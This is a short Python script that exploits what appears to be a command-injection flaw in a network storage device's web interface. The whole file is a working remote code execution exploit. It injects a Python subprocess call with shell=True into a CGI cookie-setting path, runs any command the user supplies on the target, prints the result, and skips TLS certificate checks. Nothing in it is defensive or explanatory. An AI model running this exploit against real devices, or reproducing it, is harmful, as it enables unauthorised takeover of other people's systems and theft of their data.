import requests
import pandas as pd 
import sys 

ip = sys.argv[1]
port = sys.argv[2]
command = sys.argv[3]
vuln_path = "/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+"+"and+False+or+__import__(\"subprocess\").check_output(\"{0}\",+shell=True)%23".format(command)
full_url = f"https://{ip}:{port}{vuln_path}"

def exploit():
    body = get_request(full_url)
    if body is not None:
        print(body)

def get_request(full_url):
    try:
        response = requests.get(url=full_url , verify=False , timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            return None
    except requests.RequestException as e:
        return None

if __name__=="__main__":
    exploit()